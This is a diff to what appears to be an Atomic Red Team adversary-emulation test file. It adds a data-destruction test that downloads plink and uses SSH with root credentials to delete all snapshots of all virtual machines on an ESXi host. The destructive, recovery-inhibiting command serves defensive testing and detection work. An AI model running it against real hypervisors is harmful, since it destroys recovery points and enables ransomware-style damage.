@@ -125,3 +125,41 @@ atomic_tests:
       cd "$PathToAtomicsFolder/T1485/src/T1485-4/"
       terraform init
       terraform apply -auto-approve
+- name: ESXi - Delete VM Snapshots
+  auto_generated_guid: 1207ddff-f25b-41b3-aa0e-7c26d2b546d1
+  description: |
+    Deletes all snapshots for all Virtual Machines on an ESXi Host
+    [Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#inhibit%20recovery)
+  supported_platforms:
+  - windows
+  input_arguments:
+    vm_host:
+      description: Specify the host name or IP of the ESXi server.
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on the ESXi server.
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privileged user's password.
+      type: string
+      default: password
+    plink_file:
+      description: Path to Plink
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if we have plink
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+      echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user} -pw "#{vm_pass}" "for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done"
+    name: command_prompt
+    elevation_required: false
